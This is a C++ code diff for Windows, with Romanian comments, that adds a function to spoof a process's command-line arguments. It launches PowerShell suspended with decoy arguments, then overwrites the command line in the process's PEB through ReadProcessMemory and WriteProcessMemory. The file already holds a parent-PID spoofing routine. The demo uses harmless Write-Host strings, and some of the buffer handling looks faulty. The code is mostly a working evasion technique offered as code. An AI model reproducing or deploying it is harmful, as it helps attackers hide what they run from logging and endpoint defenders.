@@ -88,6 +88,107 @@ PPROCESS_INFORMATION create_spoofed_process(wchar_t cmd[], int pid) {
     return pi;
 }
 
+PPROCESS_INFORMATION create_spoofed_cmd_process(
+    wchar_t real_args[],
+    wchar_t fake_args[],
+    LPCWSTR binary = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\0"
+) {
+    auto si = new STARTUPINFOW();
+    si->cb = sizeof(STARTUPINFOW);
+    BOOL result;
+
+    auto pi = new PROCESS_INFORMATION();
+
+    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
+    NtQueryInformationProcessFunctionProcess NtQueryInformationProcess = (NtQueryInformationProcessFunctionProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+
+    CreateProcess(
+        binary,
+        fake_args,
+        nullptr,
+        nullptr,
+        FALSE,
+        CREATE_SUSPENDED,
+        nullptr,
+        nullptr,
+        si,
+        pi);
+
+    auto pbi = new PROCESS_BASIC_INFORMATION();
+    NtQueryInformationProcess(
+        pi->hProcess,
+        ProcessBasicInformation,
+        pbi,
+        sizeof(PROCESS_BASIC_INFORMATION),
+        nullptr);
+
+    PPEB peb = new PEB();
+
+    ReadProcessMemory(
+        pi->hProcess,
+        pbi->PebBaseAddress,
+        peb,
+        sizeof(PEB),
+        nullptr);
+
+    auto parameters = new RTL_USER_PROCESS_PARAMETERS();
+
+    ReadProcessMemory(
+        pi->hProcess,
+        peb->ProcessParameters,
+        parameters,
+        sizeof(RTL_USER_PROCESS_PARAMETERS),
+        nullptr);
+
+    auto szBuffer = parameters->CommandLine.Length;
+
+    auto tmpBuf = malloc(szBuffer);
+    RtlZeroMemory(tmpBuf, szBuffer); // suprascriem zerouri in buffer
+
+    DWORD oldProtection = NULL;
+
+    result = VirtualProtect(
+        parameters->CommandLine.Buffer,
+        szBuffer,
+        PAGE_EXECUTE_READWRITE, // noua permisiune
+        &oldProtection // parametru de output, va primi toate permisiunile vechi ale memoriei
+    );
+
+    if (!result) {
+        printf("[!] Writing to Process Memory Failed With Error : %d \n", GetLastError());
+    }
+
+    printf("[+] Writing to Process : %p \n", pi->hProcess);
+
+    result = WriteProcessMemory(
+        pi->hProcess,
+        parameters->CommandLine.Buffer,
+        tmpBuf,
+        szBuffer,
+        nullptr);
+
+    if (!result) {
+        printf("[!] Writing to Process Memory Failed With Error : %d \n", GetLastError());
+    }
+
+    free(tmpBuf);
+
+    result = WriteProcessMemory(
+        pi->hProcess,
+        parameters->CommandLine.Buffer,
+        &real_args, // vom folosi argumentele reale
+        sizeof(real_args),
+        nullptr);
+
+    if (!result) {
+        printf("[!] Writing to Process Memory Failed With Error : %d \n", GetLastError());
+    }
+
+    //ResumeThread(pi->hThread);
+
+    return pi;
+}
+
 void close_process(PPROCESS_INFORMATION pi) {
     CloseHandle(pi->hThread);
     CloseHandle(pi->hProcess);
@@ -142,7 +243,7 @@ PROCESSES* enumerate_all_processes() {
 int main()
 {
 
-    wchar_t new_process_name[] = L"notepad.exe\0";
+    //wchar_t new_process_name[] = L"notepad.exe\0";
 
     /*
     PPROCESS_INFORMATION pi = create_process(new_process_name);
@@ -151,9 +252,14 @@ int main()
     printf("page    : %p\n", page);
     */
 
-    PROCESSES *processes = enumerate_all_processes();
+    //PROCESSES *processes = enumerate_all_processes();
+    
+    wchar_t real_args[] = L"powershell -c \"Write-Host Real\"";
+    wchar_t fake_args[] = L"powershell -c \"Write-Host Fake\"";
+    PPROCESS_INFORMATION pi = create_spoofed_cmd_process(real_args, fake_args);
 
-    //system("pause");
-    //close_process(pi);
+    system("pause");
+    close_process(pi);
+    
     //close_process(spi);
 }
